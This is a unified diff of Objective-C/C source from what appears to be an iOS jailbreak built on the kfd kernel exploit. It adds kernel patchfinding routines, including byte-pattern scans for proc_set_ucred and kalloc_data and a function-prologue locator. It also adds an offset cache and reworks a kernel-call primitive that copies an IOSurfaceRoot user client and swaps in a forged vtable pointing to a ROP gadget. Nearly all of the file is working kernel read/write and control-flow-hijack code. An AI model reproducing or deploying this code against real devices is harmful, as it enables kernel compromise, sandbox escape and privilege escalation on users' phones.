@@ -15,7 +15,7 @@
 #import "stage2.h"
 #import "KernelRwWrapper.h"
 #import "jailbreakd.h"
-#import "stage2.h"
+#import "offsetcache.h"
 #import <mach/mach.h>
 #import <mach-o/dyld.h>
 #import <mach-o/getsect.h>
@@ -80,7 +80,7 @@ void set_kernpmap(void) {
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
     _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
-    
+    printf("[i] kopend!\n");
     set_selftask();
     set_selfproc();
     set_kslide();
@@ -128,6 +128,13 @@ uint64_t kread64(uint64_t where) {
     uint64_t out;
     kread(_kfd, where, &out, sizeof(uint64_t));
     return out;
+}
+
+uint64_t kread_ptr(uint64_t where) {
+    
+    uint64_t ret = kread64(where);
+    return ret | 0xffffff8000000000;
+    
 }
 
 void kwrite8(uint64_t where, uint8_t what) {
@@ -228,6 +235,7 @@ void kwritebuf(uint64_t kaddr, void* input, size_t size)
 }
 
 //Thanks @Mineek too!
+typedef unsigned long long addr_t;
 static uint64_t textexec_text_addr = 0, textexec_text_size = 0;
 static uint64_t prelink_text_addr = 0, prelink_text_size = 0;
 
@@ -286,6 +294,36 @@ boyermoore_horspool_memmem(const unsigned char* haystack, size_t hlen,
     return NULL;
 }
 
+uint64_t bof64(uint64_t kfd, uint64_t ptr) {
+    for (; ptr >= 0; ptr -= 4) {
+        uint32_t op;
+        kread(kfd, (uint64_t)ptr, &op, 4);
+        if ((op & 0xffc003ff) == 0x910003FD) {
+            unsigned delta = (op >> 10) & 0xfff;
+            if ((delta & 0xf) == 0) {
+                uint64_t prev = ptr - ((delta >> 4) + 1) * 4;
+                uint32_t au;
+                kread(kfd, (uint64_t)prev, &au, 4);
+                if ((au & 0xffc003e0) == 0xa98003e0) {
+                    return prev;
+                }
+                while (ptr > 0) {
+                    ptr -= 4;
+                    kread(kfd, (uint64_t)ptr, &au, 4);
+                    if ((au & 0xffc003ff) == 0xD10003ff && ((au >> 10) & 0xfff) == delta + 0x10) {
+                        return ptr;
+                    }
+                    if ((au & 0xffc003e0) != 0xa90003e0) {
+                        ptr += 4;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    return 0;
+}
+
 void init_kernel(struct kfd* kfd) {
     uint64_t kernel_base = get_kslide() + 0xFFFFFFF007004000;
     get_kernel_section(kfd, kernel_base, "__TEXT_EXEC", "__text", &textexec_text_addr, &textexec_text_size);
@@ -322,36 +360,6 @@ u64 find_add_x0_x0_0x40_ret(struct kfd* kfd) {
     return 0;
 }
 
-uint64_t bof64(uint64_t kfd, uint64_t ptr) {
-    for (; ptr >= 0; ptr -= 4) {
-        uint32_t op;
-        kread(kfd, (uint64_t)ptr, &op, 4);
-        if ((op & 0xffc003ff) == 0x910003FD) {
-            unsigned delta = (op >> 10) & 0xfff;
-            if ((delta & 0xf) == 0) {
-                uint64_t prev = ptr - ((delta >> 4) + 1) * 4;
-                uint32_t au;
-                kread(kfd, (uint64_t)prev, &au, 4);
-                if ((au & 0xffc003e0) == 0xa98003e0) {
-                    return prev;
-                }
-                while (ptr > 0) {
-                    ptr -= 4;
-                    kread(kfd, (uint64_t)ptr, &au, 4);
-                    if ((au & 0xffc003ff) == 0xD10003ff && ((au >> 10) & 0xfff) == delta + 0x10) {
-                        return ptr;
-                    }
-                    if ((au & 0xffc003e0) != 0xa90003e0) {
-                        ptr += 4;
-                        break;
-                    }
-                }
-            }
-        }
-    }
-    return 0;
-}
-
 u64 find_proc_set_ucred_function(struct kfd* kfd) {
     // We find the place that sets up the call to zalloc_ro_mut.
     /*
@@ -361,7 +369,26 @@ u64 find_proc_set_ucred_function(struct kfd* kfd) {
     04018052   mov     w4, #0x8
     bl zalloc_ro_mut
     */
-    const uint8_t data[16] = { 0xa0, 0x00, 0x80, 0x52, 0xe1, 0x03, 0x02, 0xaa, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
+    const uint8_t _kalloc_data[16] = { 0xa0, 0x00, 0x80, 0x52, 0xe1, 0x03, 0x02, 0xaa, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
+    int current_offset = 0;
+    while (current_offset < textexec_text_size) {
+        uint8_t* buffer = malloc(0x1000);
+        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
+        uint8_t *str;
+        str = boyermoore_horspool_memmem(buffer, 0x1000, _kalloc_data, sizeof(_kalloc_data));
+        if (str) {
+            printf("[DEBUG] 0x%llx\n", str - buffer + textexec_text_addr + current_offset - get_kslide());
+            uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
+            //return str - buffer + textexec_text_addr + current_offset;
+            return bof;
+        }
+        current_offset += 0x1000;
+    }
+    return 0;
+}
+
+u64 find_kalloc_data_function(struct kfd* kfd) {
+    const uint8_t data[16] = { 0x09, 0x00, 0x82, 0x52,  0xA9, 0x01, 0xA0, 0x72, 0x08, 0x00, 0x40, 0xF9, 0x88, 0x00, 0x00, 0xB4 };
     int current_offset = 0;
     while (current_offset < textexec_text_size) {
         uint8_t* buffer = malloc(0x1000);
@@ -369,6 +396,7 @@ u64 find_proc_set_ucred_function(struct kfd* kfd) {
         uint8_t *str;
         str = boyermoore_horspool_memmem(buffer, 0x1000, data, sizeof(data));
         if (str) {
+            printf("[DEBUG] 0x%llx\n", str - buffer + textexec_text_addr + current_offset);
             uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
             //return str - buffer + textexec_text_addr + current_offset;
             return bof;
@@ -380,14 +408,41 @@ u64 find_proc_set_ucred_function(struct kfd* kfd) {
 
 void mineekpf(u64 kfd) {
     struct kfd* kfd_struct = (struct kfd*)kfd;
+    printf("[i] patchfinding!\n");
+    init_kernel(kfd_struct);
+    off_add_x0_x0_0x40_ret = getOffset(0);
+    if (off_add_x0_x0_0x40_ret == 0) {
+        printf("[-] off_add_x0_x0_0x40_ret not in cache, patchfinding\n");
+        off_add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret(kfd_struct);
+        setOffset(0, off_add_x0_x0_0x40_ret - kfd_struct->info.kernel.kernel_slide);
+    } else {
+        printf("[+] off_add_x0_x0_0x40_ret in cache\n");
+        off_add_x0_x0_0x40_ret += kfd_struct->info.kernel.kernel_slide;
+    }
+    printf("[i] off_add_x0_x0_0x40_ret: 0x%llx\n", off_add_x0_x0_0x40_ret);
+    assert(off_add_x0_x0_0x40_ret != 0);
+    off_proc_set_ucred = getOffset(1);
+    if (off_proc_set_ucred == 0) {
+        printf("[-] off_proc_set_ucred not in cache, patchfinding\n");
+        off_proc_set_ucred = find_proc_set_ucred_function(kfd_struct);
+        setOffset(1, off_proc_set_ucred - kfd_struct->info.kernel.kernel_slide);
+    } else {
+        printf("[+] off_proc_set_ucred in cache\n");
+        off_proc_set_ucred += kfd_struct->info.kernel.kernel_slide;
+    }
+    printf("[i] off_proc_set_ucred: 0x%llx\n", off_proc_set_ucred);
+    assert(off_proc_set_ucred != 0);
+    printf("[i] patchfinding complete!\n");
+    printf("[DEBUG] kalloc_data: 0x%llx", find_kalloc_data_function(kfd) - get_kslide());
+}
+
+void mineekpf151(u64 kfd) {
+    struct kfd* kfd_struct = (struct kfd*)kfd;
     printf("patchfinding!\n");
     init_kernel(kfd_struct);
     off_add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret(kfd_struct);
-    printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", off_add_x0_x0_0x40_ret);
+    printf("[i] add_x0_x0_0x40_ret_func: 0x%llx\n", off_add_x0_x0_0x40_ret);
     assert(off_add_x0_x0_0x40_ret != 0);
-    off_proc_set_ucred = find_proc_set_ucred_function(kfd_struct);
-    printf("proc_set_ucred_func @ 0x%llx\n", off_proc_set_ucred);
-    assert(off_proc_set_ucred != 0);
     printf("patchfinding complete!\n");
 }
 
@@ -403,12 +458,6 @@ uint64_t zm_fix_addr_kalloc(uint64_t addr) {
 
 //Thanks @Mineek!
 uint64_t init_kcall(void) {
-    uint64_t add_x0_x0_0x40_ret_func = 0;
-    if(off_p_ucred == 0){
-        add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret;
-    } else {
-        add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
-    }
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
@@ -426,29 +475,20 @@ uint64_t init_kcall(void) {
     uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
     uint64_t uc_vtab = kread64(uc_addr);
     
-    if(off_p_ucred == 0) {
-        if(_fake_vtable == 0) _fake_vtable = mineek_dirty_kalloc(0x1000);
-    } else {
-        if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
-    }
+    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
     
     for (int i = 0; i < 0x200; i++) {
         kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
     
-    if(off_p_ucred == 0) {
-        if(_fake_client == 0) _fake_client = mineek_dirty_kalloc(0x2000);
-    } else {
-        if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
-    }
-    
+    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
     
     for (int i = 0; i < 0x200; i++) {
         kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
     }
     kwrite64(_fake_client, _fake_vtable);
     kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
-    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
+    kwrite64(_fake_vtable+8*0xB8, off_add_x0_x0_0x40_ret);
 
     return 0;
 }
@@ -537,38 +577,16 @@ int prepare_kcall(void) {
     return 0;
 }
 
-int kalloc_using_empty_kdata_page_stage2(void) {
-
-    //init_kcall();
-
-    uint64_t allocated_kmem[2] = {0, 0};
-    allocated_kmem[0] = kalloc(0x1000);
-    allocated_kmem[1] = kalloc(0x2000);
-
-    IOServiceClose(_user_client);
-    _user_client = 0;
-    usleep(10000);
-
-    clean_dirty_kalloc(_fake_vtable, 0x1000);
-    clean_dirty_kalloc(_fake_client, 0x2000);
-    
-    _fake_vtable = allocated_kmem[0];
-    _fake_client = allocated_kmem[1];
-    printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
-
-    return 0;
-}
-
 int prepare_kcall_stage2(void) {
-    NSString* save_path = @"/tmp/kfd-arm64.plist";
+    NSString* save_path = @"/var/tmp/kfd-arm64.plist";
     if(access(save_path.UTF8String, F_OK) == 0) {
-        uint64_t sb = unsandbox(getpid());
         NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
         _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
         _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
-        sandbox(getpid(), sb);
     } else {
-        kalloc_using_empty_kdata_page_stage2();
+        save_path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/var/tmp/kfd-arm64.plist"];
+        NSLog(@"%@", save_path);
+        kalloc_using_empty_kdata_page();
         //Once if you successfully get kalloc to use fake_vtable and fake_client,
         //DO NOT use dirty_kalloc again since unstable method.
         
@@ -576,16 +594,19 @@ int prepare_kcall_stage2(void) {
             @"kcall_fake_vtable_allocations": @(_fake_vtable),
             @"kcall_fake_client_allocations": @(_fake_client),
         };
-        
+        NSLog(@"%@", dictionary);
         BOOL success = [dictionary writeToFile:save_path atomically:YES];
         if (!success) {
             printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n");
         }
+        
+        NSError* error = nil;
+        
+        //[[NSFileManager defaultManager] copyItemAtPath:save_path toPath:@"/var/tmp/kfd-arm64.plist" error:&error];
+        
         printf("Saved fake_vtable, fake_client for kcall.\n");
         printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
     }
-    
-    //init_kcall();
     
     return 0;
 }
